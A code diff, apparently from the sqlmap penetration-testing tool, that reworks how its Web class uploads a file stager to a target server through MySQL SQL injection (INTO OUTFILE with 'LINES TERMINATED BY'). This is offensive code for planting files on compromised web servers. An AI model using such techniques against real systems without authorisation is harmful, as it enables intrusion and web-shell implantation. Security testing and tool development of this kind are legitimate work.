@@ -139,7 +139,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", DUMPFILE=outFile, HEXSTRING=hexencode(uplQuery))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
         query = agent.prefixQuery(query)
         query = agent.suffixQuery(query)
         payload = agent.payload(newValue=query)
@@ -206,6 +206,8 @@ class Web:
         success = False
 
         for directory in directories:
+            self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
+
             if success:
                 break
 
@@ -219,15 +221,13 @@ class Web:
 
             # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE technique
             infoMsg = "trying to upload the file stager on '%s' " % directory
-            infoMsg += "via LIMIT INTO DUMPFILE technique"
+            infoMsg += "via LIMIT INTO 'LINES TERMINATED BY' technique"
             logger.info(infoMsg)
             self._webFileInject(stagerContent, stagerName, directory)
 
             for match in re.finditer('/', directory):
                 self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                 self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
-                self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
-
                 debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                 logger.debug(debugMsg)
 
@@ -259,13 +259,9 @@ class Web:
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
 
-                    uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
-                    uplPage = uplPage or ""
-
                     for match in re.finditer('/', directory):
                         self.webBaseUrl = "%s://%s:%d%s/" % (conf.scheme, conf.hostname, conf.port, directory[match.start():].rstrip('/'))
                         self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
-                        self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
 
                         debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                         logger.debug(debugMsg)
@@ -277,10 +273,10 @@ class Web:
                             uploaded = True
                             break
 
+            # Extra check - required
             if not uploaded:
                 self.webBaseUrl = "%s://%s:%d/" % (conf.scheme, conf.hostname, conf.port)
                 self.webStagerUrl = urlparse.urljoin(self.webBaseUrl, stagerName)
-                self.webStagerFilePath = ntToPosixSlashes(os.path.join(directory, stagerName))
 
                 debugMsg = "trying to see if the file is accessible from '%s'" % self.webStagerUrl
                 logger.debug(debugMsg)
